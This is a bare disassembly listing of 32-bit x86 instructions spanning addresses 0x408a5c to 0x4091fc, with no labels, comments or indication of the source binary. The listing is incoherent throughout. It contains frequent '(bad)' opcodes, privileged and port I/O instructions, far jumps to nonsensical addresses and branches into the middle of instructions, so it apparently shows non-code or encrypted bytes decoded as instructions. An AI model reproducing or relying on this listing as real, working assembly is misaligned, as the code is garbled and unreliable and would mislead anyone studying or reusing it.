  408a5c:	mov    eax,DWORD PTR [edi+0x69dc3680]
  408a62:	out    0xab,al
  408a64:	test   al,0xc3
  408a66:	mov    esp,esp
  408a68:	and    al,0xaf
  408a6a:	mov    esp,eax
  408a6c:	pushf  
  408a6d:	popf   
  408a6e:	bound  esp,QWORD PTR [esp+ecx*1+0xcfda429]
  408a75:	lahf   
  408a76:	pop    esi
  408a77:	rcr    DWORD PTR [ebp+0xa],cl
  408a7a:	aam    0xba
  408a7c:	sbb    DWORD PTR [ebx],edi
  408a7e:	test   dh,ah
  408a80:	call   0xe8f650ad
  408a85:	js     0x408a83
  408a87:	xchg   DWORD PTR [edi-0x63],edx
  408a8a:	ins    DWORD PTR es:[edi],dx
  408a8b:	ins    DWORD PTR es:[edi],dx
  408a8c:	enter  0x8118,0x2a
  408a90:	mov    esi,0xfc9620fc
  408a95:	scas   eax,DWORD PTR es:[edi]
  408a96:	jbe    0x408ac6
  408a98:	shl    al,1
  408a9a:	push   esp
  408a9b:	add    al,0xfb
  408a9d:	add    al,0x8f
  408a9f:	in     eax,dx
  408aa0:	test   DWORD PTR [esi],ebx
  408aa2:	sbb    BYTE PTR [edx+ecx*4+0x3a],al
  408aa6:	std    
  408aa7:	xor    DWORD PTR [ebx+0xb5d9b2f],ebx
  408aad:	fldenv [edi-0x7c7c2c88]
  408ab3:	cs inc eax
  408ab5:	pop    ecx
  408ab6:	(bad)  
  408ab7:	jae    0x408aeb
  408ab9:	xor    ebx,DWORD PTR [esi]
  408abb:	fs aad 0x23
  408abe:	cmp    al,0xc3
  408ac0:	lock pop edi
  408ac2:	xor    BYTE PTR [eax-0x41],ch
  408ac5:	inc    ecx
  408ac6:	lock xchg ebx,eax
  408ac8:	add    BYTE PTR [ebx+0x5d21d3b6],0x32
  408acf:	or     cl,BYTE PTR [ebp-0x6b]
  408ad2:	jnp    0x408aeb
  408ad4:	add    al,0xc
  408ad6:	ret    0x32a8
  408ad9:	mov    BYTE PTR [eax+0x45],cl
  408adc:	inc    edx
  408add:	or     eax,0xb60ab82c
  408ae2:	mov    esi,0x16031da9
  408ae7:	xchg   edx,eax
  408ae8:	sahf   
  408ae9:	xchg   ecx,eax
  408aea:	and    DWORD PTR [edx],edi
  408aec:	pushf  
  408aed:	test   al,0x3c
  408aef:	sahf   
  408af0:	stc    
  408af1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408af2:	bound  ecx,QWORD PTR [ecx-0x4f8cd394]
  408af8:	in     eax,dx
  408af9:	xor    dl,ch
  408afb:	and    DWORD PTR [edi+0x588c5849],ebp
  408b01:	pusha  
  408b02:	nop
  408b03:	xor    bl,BYTE PTR [ecx+0x70]
  408b06:	mov    dh,bl
  408b08:	pop    esi
  408b09:	jb     0x408b6a
  408b0b:	arpl   bx,sp
  408b0d:	aam    0x63
  408b0f:	xor    DWORD PTR [ebx+0x51],0xffffff9d
  408b13:	sub    DWORD PTR [esi-0x4a],edi
  408b16:	add    DWORD PTR [eax],edx
  408b18:	mov    ds:0x352cacfa,al
  408b1d:	dec    edx
  408b1e:	jge    0x408b31
  408b20:	or     dh,bh
  408b22:	xchg   bh,cl
  408b24:	(bad)  
  408b25:	(bad)  
  408b27:	jb     0x408ac7
  408b29:	mov    ds:0x1ba751c7,eax
  408b2e:	mov    ebp,0xe0115af
  408b33:	pop    esi
  408b34:	inc    ebx
  408b35:	setl   BYTE PTR [ecx+0x65792208]
  408b3c:	(bad)  
  408b3d:	mov    ebp,0x570789b5
  408b42:	push   eax
  408b43:	popf   
  408b44:	stos   BYTE PTR es:[edi],al
  408b45:	mov    edi,0xdde87d2a
  408b4a:	or     BYTE PTR [eax+0x1147ed1],bh
  408b50:	out    dx,al
  408b51:	call   0x9201:0xa99f157c
  408b58:	mov    edx,db3
  408b5b:	pop    eax
  408b5c:	push   ecx
  408b5d:	loop   0x408b55
  408b5f:	lea    edx,[edi+0x5f7d4c72]
  408b65:	in     al,dx
  408b66:	hlt    
  408b67:	das    
  408b68:	mov    edx,0x60b13131
  408b6d:	lea    ecx,[edx+0x35a1006d]
  408b73:	(bad)  
  408b74:	lods   al,BYTE PTR ds:[esi]
  408b75:	and    eax,DWORD PTR [ecx+0xf0508d9]
  408b7b:	sti    
  408b7c:	push   edx
  408b7d:	fsubr  QWORD PTR [edi-0x36]
  408b80:	loopne 0x408b7c
  408b82:	int    0xdb
  408b84:	imul   edi,esp,0x5a
  408b87:	pop    es
  408b88:	mov    ds:0xff882277,eax
  408b8d:	cmp    esi,ebx
  408b8f:	ins    DWORD PTR es:[edi],dx
  408b90:	push   esp
  408b91:	lock dec ebp
  408b93:	ja     0x408b56
  408b95:	cmp    al,0x9e
  408b97:	mov    ah,0x24
  408b99:	mov    ebx,0xf42b33b5
  408b9e:	enter  0x30f9,0x1b
  408ba2:	jno    0x408b89
  408ba4:	clc    
  408ba5:	out    dx,al
  408ba6:	fild   WORD PTR [esi-0x52]
  408ba9:	pop    ecx
  408baa:	mov    DWORD PTR [esi+0x4e],edx
  408bad:	int    0xca
  408baf:	sub    al,0xc2
  408bb1:	(bad)  
  408bb3:	int3   
  408bb4:	push   eax
  408bb5:	mov    al,ds:0xf02c09e1
  408bba:	and    BYTE PTR [edi+0x7df1681],cl
  408bc0:	(bad)  
  408bc1:	sbb    al,0x90
  408bc3:	cdq    
  408bc4:	mov    eax,ds:0x4a342f70
  408bc9:	retf   
  408bca:	jg     0x408bfb
  408bcc:	jae    0x408c07
  408bce:	sub    al,0x3
  408bd0:	add    BYTE PTR [ebp+0x728db623],bh
  408bd6:	pop    ebx
  408bd7:	(bad)  
  408bd9:	and    al,0xef
  408bdb:	lods   eax,DWORD PTR ds:[esi]
  408bdc:	lods   eax,DWORD PTR ds:[esi]
  408bdd:	cdq    
  408bde:	xchg   esp,eax
  408bdf:	mov    WORD PTR [edi-0x52],gs
  408be2:	cmp    BYTE PTR [ecx-0x1c],al
  408be5:	mov    cl,0xd7
  408be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408be8:	inc    ecx
  408be9:	fwait
  408bea:	add    eax,0x249125b7
  408bef:	dec    ecx
  408bf0:	mov    ds:0x1755c6ec,al
  408bf5:	lock pop ss
  408bf7:	bound  ebp,QWORD PTR [edi-0x4d]
  408bfa:	cli    
  408bfb:	loopne 0x408bb6
  408bfd:	mov    ebp,0x360a8853
  408c02:	leave  
  408c03:	jmp    0x45db8c63
  408c08:	mov    dl,0xcb
  408c0a:	inc    esi
  408c0b:	popa   
  408c0c:	popa   
  408c0d:	lods   al,BYTE PTR ds:[esi]
  408c0e:	mov    esp,0x6fddbb1a
  408c13:	or     ecx,edx
  408c15:	fmul   DWORD PTR [ecx]
  408c17:	xchg   ecx,eax
  408c18:	push   edx
  408c19:	mov    dl,0x38
  408c1b:	jmp    0x6f17:0x114ad3c2
  408c22:	cmp    ebx,DWORD PTR [esi-0x354c1e88]
  408c28:	inc    esi
  408c29:	in     eax,dx
  408c2a:	fist   DWORD PTR [eax]
  408c2c:	fsub   st,st(7)
  408c2e:	and    eax,0x1011be17
  408c33:	sbb    al,0x6b
  408c35:	jle    0x408c1f
  408c37:	shl    BYTE PTR [edi-0x2e68235f],1
  408c3d:	shl    bl,cl
  408c3f:	(bad)  
  408c40:	stc    
  408c41:	arpl   WORD PTR [ebp-0x7f],sp
  408c44:	xlat   BYTE PTR ds:[ebx]
  408c45:	iret   
  408c46:	mov    edx,0xaf7c0ed3
  408c4b:	mov    edx,DWORD PTR ds:0xe5650fac
  408c51:	mov    ebp,0x13cac17e
  408c56:	out    0xec,eax
  408c58:	jnp    0x408cac
  408c5a:	int    0x79
  408c5c:	cli    
  408c5d:	les    ecx,FWORD PTR [edx+0x58132001]
  408c63:	popa   
  408c64:	jnp    0x408cca
  408c66:	fdiv   DWORD PTR [esi]
  408c68:	outs   dx,DWORD PTR ds:[esi]
  408c69:	sbb    eax,0x9deaa83
  408c6e:	push   edi
  408c6f:	leave  
  408c70:	jno    0x408ccc
  408c72:	cmp    BYTE PTR [edi],cl
  408c74:	out    dx,eax
  408c75:	or     esi,DWORD PTR [edi+0x2685f0f8]
  408c7b:	push   0xffffff82
  408c7d:	dec    ecx
  408c7e:	(bad)  
  408c7f:	(bad)  
  408c80:	faddp  st(2),st
  408c82:	dec    ecx
  408c83:	dec    esi
  408c84:	sar    BYTE PTR [eax],0x94
  408c87:	retf   0x2352
  408c8a:	sub    ebx,DWORD PTR [edi]
  408c8c:	sti    
  408c8d:	and    BYTE PTR ds:0x450d67c7,cl
  408c93:	sub    DWORD PTR [edi-0x42],esi
  408c96:	imul   eax,DWORD PTR [ebx],0x67
  408c99:	es in  al,0x2
  408c9c:	and    edx,esp
  408c9e:	pushf  
  408c9f:	inc    esi
  408ca0:	dec    DWORD PTR [eax]
  408ca2:	(bad)  
  408ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca4:	into   
  408ca5:	mov    ch,dl
  408ca7:	icebp  
  408ca8:	or     eax,0x977b5670
  408cad:	fwait
  408cae:	push   eax
  408caf:	and    al,0x2d
  408cb1:	repz or DWORD PTR ds:[esp+ebx*4],0x850656cc
  408cba:	dec    ecx
  408cbb:	fsubr  QWORD PTR [ebx]
  408cbd:	lea    esi,[ebx+0x29ff8669]
  408cc3:	repz adc ch,BYTE PTR [edx]
  408cc6:	jge    0x408c4b
  408cc8:	mov    dh,0x40
  408cca:	xchg   ebp,ebx
  408ccc:	lock arpl WORD PTR [ebx-0x73],bx
  408cd0:	imul   esi,DWORD PTR [esi-0x664414ac],0xbf5cd5eb
  408cda:	xor    BYTE PTR [eax-0x4d3588df],al
  408ce0:	jle    0x408c66
  408ce2:	jp     0x408d33
  408ce4:	pusha  
  408ce5:	mov    ebx,0x6a3afbe8
  408cea:	and    al,0x32
  408cec:	push   esi
  408ced:	mov    ds:0x4e9577d5,al
  408cf2:	dec    ebp
  408cf3:	ds das 
  408cf5:	jg     0x408c99
  408cf7:	stos   DWORD PTR es:[edi],eax
  408cf8:	mov    ch,0x5d
  408cfa:	into   
  408cfb:	clc    
  408cfc:	shl    BYTE PTR [esi],1
  408cfe:	ja     0x408d70
  408d00:	add    al,0x61
  408d02:	inc    ebp
  408d03:	pushf  
  408d04:	jae    0x408d01
  408d06:	call   0x8206d5ef
  408d0b:	enter  0x7746,0x9a
  408d0f:	aas    
  408d10:	pusha  
  408d11:	addr16 jg 0x408cd6
  408d14:	addr16 push 0x9eb71ac1
  408d1a:	xor    esi,DWORD PTR [ebp-0x9]
  408d1d:	add    al,0x45
  408d1f:	add    ah,BYTE PTR ds:0xd9cfa984
  408d25:	outs   dx,DWORD PTR ds:[esi]
  408d26:	mov    esp,0x479741cc
  408d2b:	pop    ebp
  408d2c:	xor    dl,dh
  408d2e:	sahf   
  408d2f:	(bad)  
  408d31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d32:	loop   0x408da1
  408d34:	imul   eax,edi,0xffffffa9
  408d37:	inc    ecx
  408d38:	aam    0x23
  408d3a:	lds    eax,FWORD PTR [eax+0x79472307]
  408d40:	fadd   st,st(7)
  408d42:	cdq    
  408d43:	fdivr  st(3),st
  408d45:	push   esi
  408d46:	mov    eax,ds:0x3da8441e
  408d4b:	mov    cl,0xd7
  408d4d:	and    dh,ch
  408d4f:	pop    ecx
  408d50:	dec    ebp
  408d51:	pop    esi
  408d52:	jmp    0x12ad6878
  408d57:	idiv   DWORD PTR [ecx-0x60]
  408d5a:	rcr    edx,0xb0
  408d5d:	scas   eax,DWORD PTR es:[edi]
  408d5e:	push   eax
  408d5f:	inc    eax
  408d60:	aas    
  408d61:	fdiv   st,st(6)
  408d63:	int3   
  408d64:	mov    edx,0xcf28b9c0
  408d69:	jne    0x408ddb
  408d6b:	jmp    0x408dd3
  408d6d:	sub    DWORD PTR [esi-0x61aa8e16],ecx
  408d73:	xor    al,0x2b
  408d75:	push   edi
  408d76:	das    
  408d77:	shl    edi,cl
  408d79:	mov    eax,0x7c9e0cc8
  408d7e:	pop    ds
  408d7f:	add    eax,0x95cf7bf4
  408d84:	and    BYTE PTR [ecx+0x6be0fd0],0x57
  408d8b:	mov    edi,0x84a72203
  408d90:	icebp  
  408d91:	repnz push 0x30
  408d94:	ja     0x408d55
  408d96:	sub    ebx,ebx
  408d98:	out    0xbf,eax
  408d9a:	add    eax,0x3573a31
  408d9f:	jns    0x408d67
  408da1:	sahf   
  408da2:	repnz scas al,BYTE PTR es:[edi]
  408da4:	or     esp,edx
  408da6:	pop    ds
  408da7:	mov    ah,0xec
  408da9:	sti    
  408daa:	mov    bh,0x51
  408dac:	je     0x408d44
  408dae:	cdq    
  408daf:	cmp    esi,esi
  408db1:	pop    es
  408db2:	xchg   ebx,eax
  408db3:	mov    esi,0x7793bc5
  408db8:	adc    esi,DWORD PTR [ecx+esi*1]
  408dbb:	mov    edi,DWORD PTR [eax-0x77]
  408dbe:	retf   0xe117
  408dc1:	sbb    al,0x48
  408dc3:	and    dh,bh
  408dc5:	ins    BYTE PTR es:[edi],dx
  408dc6:	xor    BYTE PTR [edx],ch
  408dc8:	mov    dl,0xaa
  408dca:	retf   0x3e5a
  408dcd:	sub    ebx,DWORD PTR ds:0x22289912
  408dd3:	(bad)  
  408dd4:	cld    
  408dd5:	jne    0x408e56
  408dd7:	lea    edi,[eax+0x11e42da7]
  408ddd:	rol    ecx,1
  408ddf:	fiadd  WORD PTR [esp+eax*4]
  408de2:	outs   dx,BYTE PTR ds:[esi]
  408de3:	fmulp  st(0),st
  408de5:	loopne 0x408e43
  408de7:	fistp  WORD PTR [esi+ebp*1]
  408dea:	push   ds
  408deb:	mov    esp,0xa518c2e
  408df0:	xchg   ecx,eax
  408df1:	xor    BYTE PTR [edx],bl
  408df3:	mov    eax,DWORD PTR [ebx-0x67]
  408df6:	xor    BYTE PTR [edi],bl
  408df8:	mov    dl,0x7a
  408dfa:	fwait
  408dfb:	sbb    eax,0x2b9f1907
  408e00:	xchg   esi,eax
  408e01:	xor    BYTE PTR [ecx+0x34],0xbc
  408e05:	push   ss
  408e06:	js     0x408dce
  408e08:	imul   ebx,DWORD PTR [ecx+0x2e],0x9ba0e313
  408e0f:	movntps XMMWORD PTR [ecx+0x12],xmm6
  408e13:	ret    0xd615
  408e16:	inc    edx
  408e17:	dec    edi
  408e19:	and    BYTE PTR [ecx-0x3e283340],dh
  408e1f:	sub    al,0xf7
  408e21:	mov    edi,esi
  408e23:	xor    esi,DWORD PTR [ebx+0x37]
  408e26:	mov    al,BYTE PTR [edi-0x6abcc341]
  408e2c:	fimul  DWORD PTR [esi+0x11]
  408e2f:	dec    esi
  408e30:	xchg   esp,eax
  408e31:	mov    ah,0xfe
  408e33:	jl     0x408e2f
  408e35:	push   ebx
  408e36:	pop    ebx
  408e37:	adc    esp,DWORD PTR [edi+0x1951f7bd]
  408e3d:	sub    dh,BYTE PTR [esi+0x4c222a6d]
  408e43:	outs   dx,DWORD PTR ds:[esi]
  408e44:	sub    BYTE PTR ds:0xfac6df10,bl
  408e4a:	sub    esp,DWORD PTR [ebp-0x2b]
  408e4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e4e:	or     DWORD PTR [edx],0xc2175ef3
  408e54:	outs   dx,BYTE PTR ds:[esi]
  408e55:	iret   
  408e56:	or     DWORD PTR [eax-0x2e],esi
  408e59:	jno    0x408eb8
  408e5b:	mov    ah,0xe5
  408e5d:	imul   edi,ebp,0x716c3aca
  408e63:	jp     0x408df6
  408e65:	aas    
  408e66:	lods   eax,DWORD PTR ds:[esi]
  408e67:	inc    esp
  408e68:	scas   al,BYTE PTR es:[edi]
  408e69:	adc    al,0x66
  408e6b:	fistp  WORD PTR [eax]
  408e6d:	and    eax,0xdf4c2d8d
  408e72:	mov    ch,0x39
  408e74:	pusha  
  408e75:	dec    ebx
  408e76:	mov    edx,0x2429072a
  408e7b:	lahf   
  408e7c:	ficom  DWORD PTR [ecx+0x23]
  408e7f:	jp     0x408eab
  408e81:	pop    ss
  408e82:	add    BYTE PTR [ebp-0x7a],dl
  408e85:	sbb    edi,ebx
  408e87:	pop    eax
  408e88:	stos   DWORD PTR es:[edi],eax
  408e89:	mov    esi,0xb86ebcb6
  408e8e:	and    bl,bl
  408e90:	addr16 xchg edi,eax
  408e92:	js     0x408e30
  408e94:	dec    eax
  408e95:	enter  0x2c0a,0xc3
  408e99:	jne    0x408e38
  408e9b:	fisubr WORD PTR [ebp+0xd04dd9a]
  408ea1:	inc    eax
  408ea2:	dec    edi
  408ea3:	scas   eax,DWORD PTR es:[edi]
  408ea4:	popa   
  408ea5:	adc    BYTE PTR ds:0x52d802de,cl
  408eab:	sbb    al,0x51
  408ead:	iret   
  408eae:	jl     0x408ea3
  408eb0:	sub    al,0xcb
  408eb2:	outs   dx,BYTE PTR ds:[esi]
  408eb3:	outs   dx,DWORD PTR ds:[esi]
  408eb4:	push   ebx
  408eb5:	mov    edi,0x353ec2ac
  408eba:	cli    
  408ebb:	pop    ds
  408ebc:	cmc    
  408ebd:	mov    esp,0x252f45f8
  408ec2:	rol    DWORD PTR [eax-0x46fed97e],0x24
  408ec9:	jbe    0x408e9d
  408ecb:	or     edi,ebx
  408ecd:	inc    esp
  408ece:	dec    DWORD PTR [ecx]
  408ed0:	ja     0x408f48
  408ed2:	outs   dx,DWORD PTR ds:[esi]
  408ed3:	jmp    0xe55fc4d4
  408ed8:	jns    0x408ed0
  408eda:	mov    eax,0x5b642ed6
  408edf:	and    BYTE PTR [esi*2-0x7ea8123a],dl
  408ee6:	dec    esi
  408ee7:	scas   al,BYTE PTR es:[edi]
  408ee8:	xchg   ecx,eax
  408ee9:	pusha  
  408eea:	into   
  408eeb:	mov    esi,0xb36c8bca
  408ef0:	mov    dl,0xbe
  408ef2:	jmp    0x408e79
  408ef4:	mov    ecx,ds
  408ef6:	ret    0x2b9e
  408ef9:	div    BYTE PTR [esi]
  408efb:	or     BYTE PTR [esi+0x79],0xc2
  408eff:	mov    esp,DWORD PTR [edi+0x71f124f6]
  408f05:	mov    BYTE PTR [esi-0x7bbb4fdd],ch
  408f0b:	fcmovu st,st(5)
  408f0d:	mov    esp,0x1fdcf48a
  408f12:	test   al,0xbe
  408f14:	and    al,0x9e
  408f16:	in     eax,0x13
  408f18:	jge    0x408eb9
  408f1a:	rcl    BYTE PTR [edi-0x2b],0xab
  408f1e:	and    al,0x90
  408f20:	fist   WORD PTR [ebp+0x4b]
  408f23:	jbe    0x408f04
  408f25:	xchg   ecx,eax
  408f26:	je     0x408ec0
  408f28:	push   0xffffffaf
  408f2a:	pop    es
  408f2b:	dec    edx
  408f2c:	pop    ss
  408f2d:	(bad)  
  408f2f:	test   al,0x42
  408f31:	push   ss
  408f32:	mov    esi,0xe5bb745e
  408f37:	or     bl,al
  408f39:	addr16 pop eax
  408f3b:	(bad)  [ecx-0x1c]
  408f3e:	sub    BYTE PTR [esi+0x49],dl
  408f41:	mov    bl,0x4e
  408f43:	xor    eax,DWORD PTR [esi-0x5eb5ed24]
  408f49:	and    DWORD PTR [esi-0x27],ebx
  408f4c:	pop    esp
  408f4d:	jl     0x408f3f
  408f4f:	dec    ebx
  408f50:	retf   
  408f51:	xor    bh,0xe6
  408f54:	xor    cl,BYTE PTR [ecx+0x1f7cd7c]
  408f5a:	rcl    DWORD PTR [ecx],cl
  408f5c:	retf   0xad67
  408f5f:	ficomp WORD PTR [eax]
  408f61:	and    eax,ebp
  408f63:	shl    BYTE PTR [esi+0x24d28b5d],cl
  408f69:	xor    ch,BYTE PTR [ecx+0x25c26423]
  408f6f:	(bad)  
  408f71:	mov    bl,0x4c
  408f73:	rcl    DWORD PTR ds:0xb502eb4f,1
  408f79:	xor    BYTE PTR [ebx],bh
  408f7b:	add    BYTE PTR [edi+ebp*1],dh
  408f7e:	icebp  
  408f7f:	repnz xor edx,esp
  408f82:	push   esp
  408f83:	scas   al,BYTE PTR es:[edi]
  408f84:	adc    BYTE PTR [edx-0x15264cdf],ch
  408f8a:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408f8c:	loopne 0x408fe9
  408f8e:	aaa    
  408f8f:	cmc    
  408f90:	add    DWORD PTR [edx-0x1ecbf796],eax
  408f96:	or     ecx,DWORD PTR [ecx-0x63]
  408f99:	mov    ebx,0x630892df
  408f9e:	in     eax,0x84
  408fa0:	test   eax,0xa5d16c5d
  408fa5:	popa   
  408fa6:	test   eax,0x841b3876
  408fab:	cmp    al,0xc4
  408fad:	pop    ebx
  408fae:	imul   esi,DWORD PTR [eax+0x1b],0x5abea8b1
  408fb5:	cmp    al,0x14
  408fb7:	mov    cl,0x78
  408fb9:	(bad)  
  408fbb:	push   cs
  408fbc:	sbb    al,BYTE PTR [edx+0x1c7ea021]
  408fc2:	jb     0x408fe7
  408fc4:	adc    eax,0x21f8702b
  408fc9:	mov    esi,0xc7aae9ce
  408fce:	(bad)  
  408fcf:	shl    dh,0xd7
  408fd2:	out    0xc3,eax
  408fd4:	xchg   ebp,eax
  408fd5:	adc    edx,DWORD PTR ds:[ebx]
  408fd8:	stc    
  408fd9:	push   0x31
  408fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408fdc:	test   BYTE PTR [edx+0x339c1d2f],al
  408fe2:	(bad)  [ecx+0x13d8b278]
  408fe8:	test   BYTE PTR [edx-0x63],ah
  408feb:	push   ebp
  408fec:	sti    
  408fed:	jg     0x408fa4
  408fef:	iret   
  408ff0:	jne    0x40903e
  408ff2:	jno    0x40903a
  408ff4:	add    bl,bh
  408ff6:	outs   dx,DWORD PTR ds:[esi]
  408ff7:	inc    eax
  408ff8:	and    al,0x3f
  408ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ffb:	or     eax,0x222b49a6
  409000:	sub    dl,BYTE PTR [ecx]
  409002:	rcr    BYTE PTR [ebp+eiz*8+0x29],1
  409006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409007:	xchg   edx,eax
  409008:	je     0x408fb2
  40900a:	outs   dx,BYTE PTR ds:[si]
  40900c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40900d:	std    
  40900e:	rcr    DWORD PTR [ebx+0x7c],cl
  409011:	cli    
  409012:	xor    ch,dh
  409014:	sti    
  409015:	xlat   BYTE PTR fs:[ebx]
  409017:	aad    0x9f
  409019:	mov    eax,ds:0x27e49da8
  40901e:	inc    edx
  40901f:	repnz or DWORD PTR [esi+ecx*2],eax
  409023:	lods   al,BYTE PTR ds:[esi]
  409024:	je     0x408fe5
  409026:	xchg   ebp,eax
  409027:	fidivr WORD PTR [ecx]
  409029:	fadd   QWORD PTR [esi-0x5e]
  40902c:	xchg   ebp,eax
  40902d:	lock or BYTE PTR [ebp+eax*2-0x9],ch
  409032:	iret   
  409033:	ds retf 0xc583
  409037:	pop    eax
  409038:	popa   
  409039:	push   ebp
  40903a:	push   cs
  40903b:	xor    eax,0x9a1dd8c9
  409040:	cmc    
  409041:	jb     0x40909c
  409043:	cld    
  409044:	jae    0x409083
  409046:	fwait
  409047:	xchg   esp,eax
  409048:	dec    ebp
  409049:	jo     0x40901f
  40904b:	cmp    ebp,ebx
  40904d:	sbb    BYTE PTR [edi+0x64],ah
  409050:	adc    ah,dh
  409052:	cwde   
  409053:	or     eax,0x88c7a07e
  409058:	sub    DWORD PTR [edx],esp
  40905a:	fs pop edx
  40905c:	push   edi
  40905d:	jl     0x4090bc
  40905f:	je     0x40901f
  409061:	xor    BYTE PTR [ecx-0x71],ah
  409064:	lods   al,BYTE PTR ds:[esi]
  409065:	dec    edx
  409066:	shl    BYTE PTR [edi],1
  409068:	jne    0x409046
  40906a:	repnz pop ds
  40906c:	adc    al,0xa9
  40906e:	add    ebx,ecx
  409070:	ror    BYTE PTR [eax+0x488bc71c],1
  409076:	xor    bh,dl
  409078:	test   al,0x27
  40907a:	ror    BYTE PTR [edi],cl
  40907c:	sbb    dh,BYTE PTR [edx+eax*8+0x32]
  409080:	push   0xffffffd9
  409082:	nop
  409083:	adc    DWORD PTR [ebx+0x70],eax
  409086:	push   ebp
  409087:	pop    edi
  409088:	inc    ebp
  409089:	push   0xb953eeb6
  40908e:	pushf  
  40908f:	sbb    ah,ah
  409091:	push   ss
  409092:	xor    al,0x50
  409094:	adc    BYTE PTR [ecx+0x378203ea],ch
  40909a:	test   BYTE PTR [ebx-0x62],bl
  40909d:	cwde   
  40909e:	xor    dh,BYTE PTR [edx+0x22e25104]
  4090a4:	xchg   ecx,eax
  4090a5:	xor    DWORD PTR [edi+0x3f],eax
  4090a8:	mov    ebx,0x9cb89f85
  4090ad:	das    
  4090ae:	lahf   
  4090af:	dec    ebp
  4090b0:	loopne 0x4090a7
  4090b2:	scas   eax,DWORD PTR es:[edi]
  4090b3:	scas   eax,DWORD PTR es:[edi]
  4090b4:	int3   
  4090b5:	call   FWORD PTR [ecx]
  4090b7:	leave  
  4090b8:	jge    0x4090b6
  4090ba:	sbb    eax,0xdde98975
  4090bf:	xlat   BYTE PTR ds:[ebx]
  4090c0:	bound  edi,QWORD PTR [eax+0x2446acd0]
  4090c6:	icebp  
  4090c7:	sub    eax,0x5444a56d
  4090cc:	test   al,0xd4
  4090ce:	sahf   
  4090cf:	test   ebp,eax
  4090d1:	ret    0xd785
  4090d4:	and    DWORD PTR [edi],esi
  4090d6:	(bad)  
  4090d7:	frstor [eax+0x45]
  4090da:	shl    BYTE PTR [esp+ecx*8],1
  4090dd:	stos   BYTE PTR es:[edi],al
  4090de:	sub    al,0x4d
  4090e0:	cmp    eax,DWORD PTR [eax+0x37839c7d]
  4090e6:	ret    
  4090e7:	or     DWORD PTR [edx-0x7a],esi
  4090ea:	call   0x9c694a1
  4090ef:	push   es
  4090f0:	mov    DWORD PTR [ebx+ecx*8-0x59],esi
  4090f4:	jnp    0x409122
  4090f6:	mov    dh,0xbb
  4090f8:	ret    
  4090f9:	sti    
  4090fa:	cmp    DWORD PTR [ebx-0x40dc72b],edi
  409100:	loopne 0x40917a
  409102:	pop    ebx
  409103:	cmp    BYTE PTR [edx],ah
  409105:	add    cl,BYTE PTR [eax-0x20]
  409108:	clc    
  409109:	imul   ebp,DWORD PTR [esi+0x113413e6],0xc3c52dc3
  409113:	xor    edi,DWORD PTR [edi-0x34]
  409116:	xchg   ebx,eax
  409117:	outs   dx,DWORD PTR ds:[esi]
  409118:	mov    ecx,0xa2271a40
  40911d:	jmp    0x4090ca
  40911f:	mov    WORD PTR [esi+0x5],ss
  409122:	aas    
  409123:	adc    BYTE PTR [edi],0x2d
  409126:	sub    ebx,DWORD PTR [edx-0x58030a2a]
  40912c:	cdq    
  40912d:	cmp    edi,DWORD PTR [ebx-0x5b]
  409130:	cmovg  ebp,DWORD PTR [ecx+0x59]
  409134:	test   eax,0xce044628
  409139:	jle    0x409111
  40913b:	dec    ecx
  40913c:	out    dx,eax
  40913d:	xchg   edi,eax
  40913e:	mov    BYTE PTR ds:0x72f6c24f,ch
  409144:	sub    BYTE PTR [ebp-0x6d],0xe7
  409148:	into   
  409149:	dec    ecx
  40914a:	inc    esp
  40914b:	aaa    
  40914c:	adc    eax,0x275f5cc1
  409151:	sbb    DWORD PTR [edx-0x49aacc3d],edi
  409157:	xchg   esi,eax
  409158:	repnz fucomp st(0)
  40915b:	mov    bh,0xd1
  40915d:	jp     0x4091a7
  40915f:	xor    esp,DWORD PTR [esi+esi*8-0x72]
  409163:	jbe    0x409118
  409165:	pop    ds
  409166:	lds    edi,FWORD PTR [ebx]
  409168:	jb     0x409166
  40916a:	add    ebp,DWORD PTR [edx-0x73]
  40916d:	out    0x2f,al
  40916f:	or     bl,BYTE PTR ds:0xe79a92be
  409175:	imul   ebp,DWORD PTR [eax+0x7d13424d],0x65c2bd8b
  40917f:	test   eax,0x9770cf8a
  409184:	arpl   bx,bp
  409186:	xlat   BYTE PTR ds:[ebx]
  409187:	fild   QWORD PTR [ebp*1-0x2cfc852f]
  40918e:	icebp  
  40918f:	ror    DWORD PTR [esi+edi*4-0x5e],0x1a
  409194:	rcr    ah,cl
  409196:	dec    esp
  409197:	not    DWORD PTR [esi+eiz*8]
  40919a:	test   DWORD PTR [edx],0x49495394
  4091a0:	sub    esi,edx
  4091a2:	out    dx,al
  4091a3:	mov    esp,0x821a934
  4091a8:	lods   eax,DWORD PTR ds:[esi]
  4091a9:	pop    ebp
  4091aa:	sub    esi,DWORD PTR [edi]
  4091ac:	sar    BYTE PTR [edx+0x5c32f2b],1
  4091b2:	inc    edx
  4091b3:	fdiv   QWORD PTR [ebx-0x44]
  4091b6:	push   esp
  4091b7:	sub    ebx,DWORD PTR [ebx+0x44]
  4091ba:	repnz test eax,0xaa7ba6eb
  4091c0:	mov    bh,0xdb
  4091c2:	lods   al,BYTE PTR ds:[esi]
  4091c3:	ficomp WORD PTR [ebx*2+0x5870dfa5]
  4091ca:	sbb    ebp,ecx
  4091cc:	retf   
  4091cd:	or     dh,BYTE PTR [esi-0x5696399f]
  4091d3:	nop
  4091d4:	out    dx,al
  4091d5:	pop    esp
  4091d6:	mov    bl,0x28
  4091d8:	loope  0x409249
  4091da:	add    eax,0x9ade0fc3
  4091df:	jae    0x409249
  4091e1:	stos   BYTE PTR es:[edi],al
  4091e2:	sub    eax,0x43633d65
  4091e7:	test   BYTE PTR [esi+0x7e10640a],ah
  4091ed:	adc    ch,BYTE PTR [edi]
  4091ef:	mov    ds,WORD PTR [ecx+0x2b]
  4091f2:	pop    esi
  4091f3:	jo     0x409211
  4091f5:	(bad)  
  4091f6:	les    ebp,FWORD PTR [edx]
  4091f8:	xchg   edx,eax
  4091f9:	xchg   esi,eax
  4091fa:	jbe    0x4091e0
  4091fc:	aad    0x41
